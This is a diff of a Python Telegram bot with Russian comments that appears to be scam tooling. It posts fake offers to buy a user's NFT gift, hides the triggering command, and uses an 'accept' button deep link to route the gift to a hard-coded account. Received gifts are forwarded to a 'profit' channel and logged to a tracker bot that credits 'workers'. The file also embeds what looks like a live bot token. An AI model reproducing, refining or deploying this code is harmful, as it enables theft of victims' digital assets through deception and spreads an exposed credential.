@@ -14,7 +14,7 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # --- НАСТРОЙКИ ОФФЕР-БОТА ---
 TOKEN = "9056825852:AAH-AKRlntMSkdLMfEbBqB9HsFcPsZFqabA"
-TARGET_ID = 9158877731 # <--- ОБЯЗАТЕЛЬНО ЦИФРОВОЙ ID АККАУНТА @rattiixx (не канала!)
+TARGET_ID = 9158877731  # <--- ОБЯЗАТЕЛЬНО ЦИФРОВОЙ ID АККАУНТА @rattiixx
 CURRENCY = {"g": "💎", "s": "⭐"}
 
 # --- НАСТРОЙКИ СВЯЗКИ С ТРЕКЕР-БОТОМ ---
@@ -26,7 +26,6 @@ PROFIT_TOPIC_ID = 3  # ID ТОПИКА (вкладки) в группе
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
-PENDING_GIFTS: dict[str, dict] = {} # Для связи подарка с воркером
 
 def offer_kb(oid: str) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[
@@ -37,6 +36,7 @@ def offer_kb(oid: str) -> InlineKeyboardMarkup:
 def instruction_kb() -> InlineKeyboardMarkup:
     # ОБХОДНОЙ ПУТЬ: открывает системное окно отправки подарка
     deep_link = f"tg://send_gift?user_id={TARGET_ID}"
+    
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 Передать NFT", url=deep_link)],
         [InlineKeyboardButton(text="❓ Как передать?", callback_data="alert_2")],
@@ -77,14 +77,16 @@ async def cmd_offer_business(message: Message):
     # Текст с превью NFT
     caption = f"Пользователь <b>{who}</b> предлагает Вам {raw_sum} {CURRENCY[cur_key]} за подарок <b>{gift_name}</b>.\n\n{url}"
 
+    # Удаляем команду
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
             message_ids=[message.message_id]
         )
     except Exception as e:
-        logging.error(f"delete: {e}")
+        logging.error(f"delete error: {e}")
 
+    # Отправляем оффер
     try:
         await bot.send_message(
             chat_id=message.chat.id, text=caption, reply_markup=offer_kb(oid),
@@ -92,7 +94,7 @@ async def cmd_offer_business(message: Message):
             link_preview_options=LinkPreviewOptions(is_disabled=False, prefer_large_media=True, show_above_text=True)
         )
     except Exception as e:
-        logging.error(f"send: {e}")
+        logging.error(f"send error: {e}")
 
 # --- НАЖАТИЕ «ПРИНЯТЬ» ---
 @dp.callback_query(F.data.startswith("acc:"))
@@ -118,7 +120,7 @@ async def on_accept(call: CallbackQuery):
         except Exception:
             pass
     except Exception as e:
-        logging.error(f"edit: {e}")
+        logging.error(f"edit error: {e}")
     await call.answer()
 
 # --- ВСПЛЫВАЮЩИЕ ОКНА ---
@@ -137,7 +139,7 @@ async def on_decline(call: CallbackQuery):
     await call.message.edit_text(text="Вы отклонили предложение.", reply_markup=None)
     await call.answer("Отклонено")
 
-# --- ЛОВИМ ПОДАРОК (ЕСЛИ ОН ПРИХОДИТ) ---
+# --- ЛОВИМ ПОДАРОК (ЕСЛИ ОН ПРИХОДИТ В ЛС) ---
 @dp.business_message(F.gift)
 async def handle_gift(message: Message):
     gift = message.gift
@@ -154,7 +156,7 @@ async def handle_gift(message: Message):
     base_name = getattr(gift, "base_name", "") or ""
     gift_id = getattr(gift, "id", "")
     
-    # 1. Пересылаем сам подарок в канал профитов
+    # 1. Пересылаем подарок в канал профитов
     try:
         await bot.forward_message(
             chat_id=PROFIT_CHANNEL_ID, message_thread_id=PROFIT_TOPIC_ID,
@@ -162,7 +164,7 @@ async def handle_gift(message: Message):
             business_connection_id=message.business_connection_id
         )
     except Exception as e:
-        logging.error(f"forward: {e}")
+        logging.error(f"forward error: {e}")
 
     # 2. Отправляем команду Трекер-боту
     text = f"/add_profit {worker_id} {stars} {base_name} {gift_id}"
@@ -171,13 +173,13 @@ async def handle_gift(message: Message):
         async with aiohttp.ClientSession() as session:
             async with session.post(url, json={"chat_id": TRACKER_ADMIN_ID, "text": text}) as resp:
                 if resp.status != 200:
-                    logging.error(f"tracker: {await resp.text()}")
+                    logging.error(f"tracker error: {await resp.text()}")
     except Exception as e:
-        logging.error(f"http: {e}")
+        logging.error(f"http error: {e}")
 
 async def main():
     logging.basicConfig(level=logging.INFO)
-    print("Оффер-бот запущен (кнопка открывает окно)...")
+    print("Оффер-бот запущен...")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
